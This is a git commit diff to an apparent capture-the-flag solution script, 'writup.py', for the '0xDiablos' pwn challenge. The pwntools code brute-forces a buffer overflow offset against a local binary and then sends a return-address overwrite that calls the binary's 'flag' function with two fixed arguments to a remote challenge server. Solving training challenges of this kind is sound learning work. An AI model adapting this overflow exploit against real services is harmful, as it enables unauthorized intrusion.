45b385747954e3dbd845921f668a78508786d281
Herrfalco <cadet.florian@gmail.com>
2023-11-10 00:37:25 +0100

    0xDiablos

--- challenges/Pwn/0xDiablos/writup.py
+++ challenges/Pwn/0xDiablos/writup.py
@@ -9,14 +9,25 @@ if __name__ == '__main__':
         exit(1)
 
     context.binary = 'vuln'
-    elf = ELF('vuln')
+    elf = ELF('./vuln')
     print(elf)
-    ip, port = sys.argv[1].split(':')
-    for i in range(180, 250, 1):
-        with remote(ip, port) as rem:
-            print(rem.recvline())
-            rem.sendline(b' ' * i + pack(elf.symbols['flag']))
+    exploit = pack(elf.symbols['flag']) + b'\x80' * 4 + pack(0xdeadbeef) + pack(0xc0ded00d)
+    offset = 0
+    for i in range(180, 200):
+        with process('./vuln') as proc:
+            proc.recvline()
+            proc.sendline(b' ' * i + exploit)
+            proc.recvline()
             try:
-                print(rem.recvline())
-            except EOFError, pwnlib:
-                print('BING')
+                print(proc.recvline())
+                offset = i
+                break
+            except EOFError:
+                pass
+
+    ip, port = sys.argv[1].split(':')
+    with remote(ip, port) as rem:
+        rem.recvline()
+        rem.sendline(b'A' * offset + exploit)
+        rem.recvline()
+        warn(rem.recvuntil(b'}'))
